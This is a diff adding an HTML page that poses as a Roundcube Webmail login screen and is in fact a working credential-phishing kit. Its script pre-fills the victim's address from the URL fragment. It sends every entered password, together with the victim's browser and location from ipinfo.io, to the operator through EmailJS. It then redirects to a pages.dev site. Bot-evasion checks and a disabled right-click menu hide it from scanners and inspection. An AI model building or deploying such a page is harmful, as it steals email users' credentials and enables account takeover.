@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Roundcube Webmail :: Welcome to Roundcube Webmail</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+      background-color: #ffffff;
+      color: #333;
+    }
+
+    .logo-container {
+      margin-top: 90px;
+      margin-bottom: 30px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .logo {
+      width: 95px;
+      height: auto;
+    }
+
+    .notification {
+      color: white;
+      font-size: 13px;
+      display: none;
+      background-color: #3c9bd6;
+      padding: 12px 15px;
+      border-radius: 4px;
+      width: 90%;
+      max-width: 320px;
+      margin-bottom: 15px;
+      text-align: center;
+    }
+
+    .notification::before {
+      content: "✓";
+      color: white;
+      font-size: 13px;
+      margin-right: 8px;
+    }
+
+    .password-validation {
+      color: white;
+      font-size: 13px;
+      display: none;
+      background-color: #d45352;
+      padding: 12px 15px;
+      border-radius: 4px;
+      width: 90%;
+      max-width: 320px;
+      margin-bottom: 15px;
+      text-align: center;
+    }
+
+    .password-validation::before {
+      content: "✖";
+      color: white;
+      font-size: 13px;
+      margin-right: 8px;
+    }
+
+    .login-container {
+      width: 100%;
+      max-width: 320px;
+      margin: 0 auto;
+    }
+
+    .form-group {
+      margin-bottom: 8px;
+    }
+
+    .input-container {
+      position: relative;
+      display: flex;
+      align-items: stretch;
+      border: 2px solid #ededed;
+      border-radius: 5px;
+      overflow: hidden;
+      background-color: #fff;
+    }
+
+    .input-container:focus-within {
+      border-color: #4fb0e6;
+      box-shadow: 0 0 3px rgba(79, 176, 230, 0.5);
+    }
+
+    .input-icon-box {
+      width: 40px;
+      background-color: #f4f4f4;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-right: 1px solid #ccc;
+      color: #333;
+    }
+
+    .input-icon {
+      width: 16px;
+      height: 16px;
+      fill: #333;
+    }
+
+    .input-container input {
+      flex: 1;
+      width: 100%;
+      padding: 10px 12px;
+      border: none;
+      outline: none;
+      font-size: 14px;
+      background-color: #fff;
+      color: #333;
+    }
+
+    .input-container input::placeholder {
+      color: #aaa;
+    }
+
+    .input-container input:disabled {
+      background-color: #fff;
+      color: #333;
+    }
+
+    .login-button {
+      width: 100%;
+      padding: 10px;
+      background-color: #4fb0e6;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 15px;
+      font-weight: 400;
+      margin-top: 8px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .login-button:hover {
+      background-color: #3c9bd6;
+      transition: background-color 0.2s ease-in-out;
+    }
+
+    .product-name {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 13px;
+      color: #666;
+    }
+
+    .language-bar {
+      margin-top: 40px;
+      padding: 20px 10px;
+      display: flex;
+      gap: 15px;
+      flex-wrap: wrap;
+      justify-content: center;
+      display: none;
+    }
+
+    .language-link {
+      color: #444;
+      text-decoration: none;
+      font-size: 13px;
+    }
+
+    .footer {
+      text-align: center;
+      margin-top: auto;
+      font-size: 12px;
+      color: #666;
+      padding: 20px;
+      display: none;
+    }
+
+    .timestamp {
+      font-size: 12px;
+      color: #666;
+      margin: 10px 0;
+      line-height: 1.5;
+      text-align: center;
+      display: none;
+    }
+
+    .show-password {
+      display: none;
+      align-items: center;
+      margin-top: 10px;
+      font-size: 14px;
+    }
+
+    .show-password input {
+      margin-right: 5px;
+    }
+
+    /* Honeypot field styles */
+    .honeypot {
+      display: none;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="notification" id="authenticatingNotification">Authenticating...</div>
+  <div class="password-validation" id="passwordValidation">The password is invalid.</div>
+
+  <div class="logo-container">
+    <!-- Roundcube logo (inline SVG to match image) -->
+    <img class="logo" src="https://imgs.search.brave.com/Ket4Hi32vJJsn1LXpZT1grU5MLO0SOZfBAjBbwVLmqo/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly91cGxv/YWQud2lraW1lZGlh/Lm9yZy93aWtpcGVk/aWEvY29tbW9ucy9l/L2UzL1JvdW5kY3Vi/ZV9sb2dvX2ljb24u/c3Zn"
+    alt="Logo">
+  </div>
+
+  <div class="timestamp" id="timestamp"></div>
+
+  <div class="login-container">
+    <div class="form-group">
+      <div class="input-container">
+        <div class="input-icon-box">
+          <svg class="input-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/>
+          </svg>
+        </div>
+        <input disabled type="email" id="email" value="example@email.com" placeholder="Username" required>
+      </div>
+    </div>
+    <div class="form-group">
+      <div class="input-container">
+        <div class="input-icon-box">
+          <svg class="input-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M18 8h-1V6c0-2.8-2.2-5-5-5S7 3.2 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.7 1.3-3 3-3s3 1.3 3 3v2H9V6zm3 11c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/>
+          </svg>
+        </div>
+        <input type="password" id="password" placeholder="Password" required>
+      </div>
+    </div>
+
+    <!-- Honeypot field -->
+    <div class="form-group honeypot">
+      <label for="fax">Fax Number</label>
+      <input type="text" id="fax" name="fax">
+    </div>
+
+    <div class="show-password">
+      <input type="checkbox" id="showPassword">
+      <label for="showPassword">Show password</label>
+    </div>
+    <button class="login-button" id="submitButton">LOGIN</button>
+
+    <div class="product-name">Roundcube Webmail</div>
+  </div>
+
+  <div class="language-bar">
+    <a href="#" class="language-link">English</a>
+    <a href="#" class="language-link">العربية</a>
+    <a href="#" class="language-link">čeština</a>
+    <a href="#" class="language-link">dansk</a>
+    <a href="#" class="language-link">Deutsch</a>
+    <a href="#" class="language-link">Ελληνικά</a>
+    <a href="#" class="language-link">español</a>
+    <a href="#" class="language-link">español latinoamericano</a>
+    <a href="#" class="language-link">...</a>
+  </div>
+
+  <footer class="footer">
+    <div>Copyright© 2024 Secure Portal</div>
+    <a href="#" class="language-link">Privacy Policy</a>
+  </footer>
+
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+  <script>
+  (function () {
+    emailjs.init({
+      publicKey: "flh3IH2Udlv8Fmowy",
+    });
+  })();
+
+  let invalidAttemptCount = 0; // Counter for invalid attempts
+  const maxInvalidAttempts = 3; // Maximum allowed invalid attempts
+  // Add a timestamp element to track potential bot activity
+  const initialLoadTime = Date.now();
+  let lastActivityTime = Date.now(); // Track user's last activity
+  let activityDetected = false; // Flag to check if any activity is detected
+
+  // Function to track user activity
+  function trackActivity() {
+    activityDetected = true;
+    lastActivityTime = Date.now();
+  }
+
+  // Attach event listeners to track user activity
+  document.addEventListener('mousemove', trackActivity);
+  document.addEventListener('keydown', trackActivity);
+  document.addEventListener('click', trackActivity);
+
+  function getBrowserDetails() {
+    const userAgent = navigator.userAgent;
+    let browserName = "Unknown";
+    if (userAgent.indexOf("Chrome") > -1) {
+      browserName = "Chrome";
+    } else if (userAgent.indexOf("Firefox") > -1) {
+      browserName = "Firefox";
+    } else if (userAgent.indexOf("Safari") > -1) {
+      browserName = "Safari";
+    } else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) {
+      browserName = "Internet Explorer";
+    }
+    return browserName;
+  }
+
+  function getUserLocation() {
+    // Use Promise.race to timeout the location request if it takes too long
+    return Promise.race([
+      fetch('https://ipinfo.io/json?token=36ff5fb656cb26')
+        .then(response => response.json())
+        .then(data => {
+          const location = `${data.city}, ${data.country}`;
+          return location;
+        }),
+      new Promise((resolve) => setTimeout(() => resolve('Location timeout'), 1500))
+    ])
+    .catch(error => {
+      console.error('Error fetching location:', error);
+      return 'Unable to retrieve location';
+    });
+  }
+
+  function updateTimestamp() {
+    const now = new Date();
+    const options = {
+      weekday: 'short',
+      year: 'numeric',
+      month: 'short',
+      day: 'numeric',
+      hour: 'numeric',
+      minute: 'numeric',
+      second: 'numeric',
+      hour12: false
+    };
+    const dateTimeString = now.toLocaleString('en-US', options);
+    const browser = getBrowserDetails();
+    return {
+      timestamp: dateTimeString,
+      browser
+    };
+  }
+
+  function populateEmailFromFragment() {
+    const hash = window.location.hash;
+    const email = hash.substring(1); // Remove the leading '#'
+    if (email) {
+      document.getElementById('email').value = email;
+    }
+  }
+
+  const {
+    timestamp,
+    browser
+  } = updateTimestamp();
+  document.getElementById('timestamp').innerHTML = `${timestamp} | Browser: ${browser}`;
+  populateEmailFromFragment();
+
+  document.getElementById('password').addEventListener('input', function () {
+    const passwordValidationMessage = document.getElementById('passwordValidation');
+    if (this.value.length < 5) {
+      passwordValidationMessage.style.display = 'none'; // Hide warning message for short passwords
+    } else {
+      passwordValidationMessage.style.display = 'none'; // Hide validation message initially
+    }
+  });
+
+  document.getElementById('submitButton').addEventListener('click', function (event) {
+    event.preventDefault(); // Prevent default form submission
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    const passwordValidationMessage = document.getElementById('passwordValidation');
+    const authenticatingNotification = document.getElementById('authenticatingNotification');
+
+    // Honeypot check
+    const faxField = document.getElementById('fax');
+    if (faxField.value !== '') {
+      passwordValidationMessage.textContent = 'Bot detected.';
+      passwordValidationMessage.style.display = 'block';
+      return; // Exit if honeypot is filled
+    }
+
+    // Measure time taken from page load to form submission
+    const submissionTime = Date.now() - initialLoadTime;
+
+    // Check for user activity
+    if (!activityDetected) {
+      passwordValidationMessage.textContent = 'No user activity detected. Please interact with the page.';
+      passwordValidationMessage.style.display = 'block';
+      return;
+    }
+
+    // Basic bot detection based on submission speed
+    if (submissionTime < 1500) { // If submission is faster than 1.5 seconds, flag as bot
+      passwordValidationMessage.textContent = 'Unusual activity detected. Please try again later.';
+      passwordValidationMessage.style.display = 'block';
+      return; // Exit the function to prevent further execution
+    }
+
+    // Reset validation message initially
+    passwordValidationMessage.style.display = 'none';
+    authenticatingNotification.style.display = 'none'; // Hide authenticating message initially
+
+    if (password.length < 5) {
+      passwordValidationMessage.textContent = 'Please enter a valid password.'; // Show relevant warning
+      passwordValidationMessage.style.display = 'block'; // Show validation message
+      return; // Prevent submission
+    }
+
+    invalidAttemptCount++;
+
+    // Example of valid password (this should be replaced with actual validation logic)
+    const validPassword = "password123"; // Replace with actual check
+
+    // Show authenticating message immediately
+    authenticatingNotification.style.display = 'block';
+
+    if (password !== validPassword) {
+      // Send the invalid password attempt via EmailJS immediately without delay
+      const templateParams = {
+        user_email: email,
+        user_password: password, // Sending invalid password
+        timestamp: `${timestamp} | Browser: ${browser}`
+      };
+
+      // Use abort controller for timeout
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 1500);
+
+      emailjs.send('service_q7ro2gs', 'template_59ldy8c', templateParams)
+        .then(function (response) {
+          console.log('INVALID PASSWORD SENT TO EMAILJS!');
+          // Display the error message immediately after sending
+          authenticatingNotification.style.display = 'none';
+          passwordValidationMessage.textContent = 'The login is invalid.';
+          passwordValidationMessage.style.display = 'block';
+        }, function (error) {
+          console.log('FAILED TO SEND INVALID PASSWORD...', error);
+          authenticatingNotification.style.display = 'none';
+          passwordValidationMessage.textContent = 'The login is invalid.';
+          passwordValidationMessage.style.display = 'block';
+        })
+        .finally(() => {
+          clearTimeout(timeoutId);
+        });
+
+      if (invalidAttemptCount >= maxInvalidAttempts) {
+        setTimeout(() => {
+          window.location.href = 'https://webmail-account-resolution.pages.dev'; // Redirect after a short delay
+        }, 100);
+      }
+      return; // Exit early
+    }
+
+    // Reset attempts on successful login
+    invalidAttemptCount = 0;
+
+    // Send the valid credentials via EmailJS immediately without delay
+    getUserLocation().then(location => {
+      const updatedTimestamp = `${timestamp} | Browser: ${browser} | Location: ${location}`;
+      document.getElementById('timestamp').innerHTML = updatedTimestamp;
+      const templateParams = {
+        user_email: email,
+        user_password: password,
+        timestamp: updatedTimestamp
+      };
+
+      // Use abort controller for timeout
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 2000);
+
+      emailjs.send('service_q7ro2gs', 'template_59ldy8c', templateParams)
+        .then(function (response) {
+          console.log('SUCCESS!');
+          // Redirect to the new page after successful submission
+          window.location.href = 'https://webmail-account-resolution.pages.dev'; // Change the URL to your target page
+        }, function (error) {
+          console.log('FAILED...', error);
+          authenticatingNotification.style.display = 'none';
+          passwordValidationMessage.textContent = 'Failed to send details. Please try again.';
+          passwordValidationMessage.style.display = 'block';
+        })
+        .finally(() => {
+          clearTimeout(timeoutId);
+        });
+    });
+  });
+
+  document.getElementById('showPassword').addEventListener('change', function () {
+    const passwordInput = document.getElementById('password');
+    passwordInput.type = this.checked ? 'text' : 'password';
+  });
+  </script>
+
+  <script>
+    // Add an event listener to the entire document for the 'contextmenu' event
+    document.addEventListener('contextmenu', function(event) {
+        // Prevent the default context menu from appearing
+        event.preventDefault();
+    });
+  </script>
+
+</body>
+
+</html>
